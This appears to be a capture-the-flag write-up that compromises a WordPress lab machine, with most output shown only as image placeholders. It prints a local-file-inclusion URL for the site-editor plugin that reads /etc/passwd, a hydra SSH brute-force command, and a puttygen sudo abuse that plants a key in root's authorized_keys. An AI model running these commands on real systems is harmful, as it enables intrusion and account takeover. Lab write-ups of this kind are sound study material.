# ENUMERATION


## OPEN PORTS

![](Pasted image 20241031135702.png)
2 open ports, one is a website and the other is ssh, let's fuzz the website

## FUZZING

![](Pasted image 20241031135726.png)

Seems like a WordPress page, let's take a look at it:


![](Pasted image 20241031135814.png)

First part seems off, let's look at the source code:

![](Pasted image 20241031135908.png)

Nothing too weird, let's save it in case we need it further, now, let's take a look at 
`wp-login.php`:

![](Pasted image 20241031140023.png)

We need to add `asucar.dl` to `/etc/hosts`:

![](Pasted image 20241031140104.png)


Knowing that the site uses WordPress, let's use `wpscan` to enumerate the website:


```ad-hint

##### USED COMMAND

`wpscan --url http://asucar.dl/ --random-user-agent`

```

So, important info would be the following:

```ad-important

1. Apache/2.4.59 server(DEBIAN)
2. XML-RPC enabled and directory listing enabled for `http://asucar.dl/wp-content/uploads`
3. Site uses wordpress 6.5.3  with the `twentytwentyfour` theme.
4. `site-editor` plugin not updated running version 1.1
```


# EXPLOITATION


So, once we've enumerated all the info in the WordPress website, let's begin with exploitation, first, let's use `searchsploit` to lookup any exploit regarding that site editor version:

![](Pasted image 20241031142025.png)

Nice, we got a [[CYBERSECURITY/Bug Bounty/Vulnerabilities/SERVER SIDE VULNERABILITIES/FILE INCLUSION VULNERABILITIES/LOCAL FILE INCLUSION (LFI)|LFI]]regarding this version, let's take a look at the exploit:

![](Pasted image 20241031142212.png)

So, the usage would be:

```ad-important

# USAGE

`http://<host>/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd`

# asucar.dl exploitation:

`http://asucar.dl/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd`

```


Let's exploit it:

![](Pasted image 20241031142325.png)

Nice, we were able to execute the [[CYBERSECURITY/Bug Bounty/Vulnerabilities/SERVER SIDE VULNERABILITIES/FILE INCLUSION VULNERABILITIES/LOCAL FILE INCLUSION (LFI)|LFI]], we found user `curiosito`

Let's use hydra and try to bruteforce the ssh login:


```ad-hint

##### USED COMMAND

`hydra -l curiosito -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 10`

##### OUTPUT

![](Pasted image 20241031142628.png)


```

Simple password, seems like the user didn't have that much security, let's log in to ssh:

![](Pasted image 20241031142733.png)

Nice, we can begin with PRIVESC




# PRIVILEGE ESCALATION



## SUDO -L

![](Pasted image 20241031142756.png)

We can run `puttygen`, `puttygen` is used to generate ssh keys, let's generate one for root user:

```ad-hint

##### USED


`puttygen -t rsa -b 2048 -O private-openssh -o ~/.ssh/hacked`

`puttygen -L ~/.ssh/hacked » ~/.ssh/authorized_keys`

`sudo puttygen /home/curiosito/.ssh/hacked -o /root/.ssh/hacked
`
`sudo puttygen /home/curiosito/.ssh/hacked -o /root/.ssh/authorized_keys -O public-openssh`

`ssh -i /home/curiosito/.ssh/hacked root@localhost`


##### OUTPUT

![](Pasted image 20241031143301.png)


```



And that would be it for this CTF!
